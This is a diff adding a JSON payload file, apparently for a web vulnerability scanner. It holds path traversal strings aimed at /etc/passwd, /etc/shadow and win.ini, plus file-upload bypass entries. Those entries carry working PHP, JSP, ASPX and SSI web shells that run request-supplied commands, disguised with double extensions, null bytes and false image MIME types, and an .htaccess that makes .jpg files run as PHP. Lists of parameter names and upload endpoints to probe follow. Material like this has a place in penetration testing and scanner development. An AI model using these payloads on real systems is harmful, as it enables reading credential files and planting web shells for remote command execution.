@@ -1,0 +1,107 @@
+{
+  "file_traversal_payloads": [
+    "../etc/passwd",
+    "../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "....////....////....////....////etc/passwd",
+    "..%2Fetc%2Fpasswd",
+    "..%252Fetc%252Fpasswd",
+    "%2e%2e%2fetc%2fpasswd",
+    "%2e%2e/%2e%2e/etc/passwd",
+    "....//....//etc/passwd",
+    "..\\..\\windows\\win.ini",
+    "..%5C..%5Cwindows%5Cwin.ini",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/hosts",
+    "/windows/win.ini",
+    "C:\\Windows\\win.ini"
+  ],
+  "file_upload_bypass_payloads": [
+    {
+      "filename": "shell.php",
+      "content": "<?php system($_GET['cmd']); ?>",
+      "mime_type": "application/octet-stream"
+    },
+    {
+      "filename": "shell.php%00",
+      "content": "<?php system($_GET['cmd']); ?>",
+      "mime_type": "image/jpeg"
+    },
+    {
+      "filename": "shell.php.",
+      "content": "<?php system($_GET['cmd']); ?>",
+      "mime_type": "image/png"
+    },
+    {
+      "filename": "shell.phtml",
+      "content": "<?php system($_GET['cmd']); ?>",
+      "mime_type": "image/jpeg"
+    },
+    {
+      "filename": "shell.php5",
+      "content": "<?php system($_GET['cmd']); ?>",
+      "mime_type": "image/gif"
+    },
+    {
+      "filename": "shell.php7",
+      "content": "<?php system($_GET['cmd']); ?>",
+      "mime_type": "image/jpeg"
+    },
+    {
+      "filename": "shell.shtml",
+      "content": "<!--#exec cmd='id' -->",
+      "mime_type": "text/html"
+    },
+    {
+      "filename": "shell.jsp",
+      "content": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+      "mime_type": "image/jpeg"
+    },
+    {
+      "filename": "shell.aspx",
+      "content": "<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\")); %>",
+      "mime_type": "image/png"
+    },
+    {
+      "filename": ".htaccess",
+      "content": "AddType application/x-httpd-php .jpg",
+      "mime_type": "text/plain"
+    }
+  ],
+  "file_param_names": [
+    "file",
+    "path",
+    "filename",
+    "filepath",
+    "document",
+    "page",
+    "template",
+    "include",
+    "load",
+    "read",
+    "src",
+    "source",
+    "resource",
+    "download",
+    "export",
+    "import"
+  ],
+  "upload_endpoints": [
+    "/upload",
+    "/api/upload",
+    "/file/upload",
+    "/media/upload",
+    "/upload.php",
+    "/upload.asp",
+    "/upload.aspx",
+    "/api/v1/upload",
+    "/files/upload",
+    "/images/upload",
+    "/documents/upload",
+    "/attachments/upload",
+    "/admin/upload"
+  ]
+}
